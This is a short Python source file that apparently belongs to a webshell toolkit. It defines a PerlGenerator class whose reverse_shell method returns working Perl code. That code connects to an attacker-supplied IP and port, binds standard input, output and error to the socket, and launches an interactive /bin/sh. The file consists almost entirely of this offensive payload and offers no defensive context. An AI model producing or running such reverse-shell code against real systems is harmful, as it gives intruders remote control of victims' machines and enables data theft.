"""Perl code generator for webshell operations."""


class PerlGenerator:
    """Generate Perl code for webshell operations."""

    @staticmethod
    def reverse_shell(target_ip: str, target_port: int) -> str:
        """Generate Perl reverse shell code."""
        return f"""use Socket;
$i="{target_ip}";
$p={target_port};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}};"""
